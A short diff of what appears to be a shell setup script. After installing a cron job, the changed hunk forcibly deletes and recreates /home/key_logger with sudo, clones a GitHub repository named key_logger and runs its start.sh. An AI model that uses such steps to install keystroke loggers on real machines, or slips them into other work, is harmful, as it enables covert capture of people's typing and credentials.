@@ -32,8 +32,8 @@ sudo crontab mycron
 sudo rm mycron
 
 #config key_logger
-
-mkdir /home/key_logger
+sudo rm -r /home/key_logger
+sudo mkdir /home/key_logger
 cd /home/key_logger
 git clone https://github.com/KoiFresh/key_logger.git
 bash start.sh
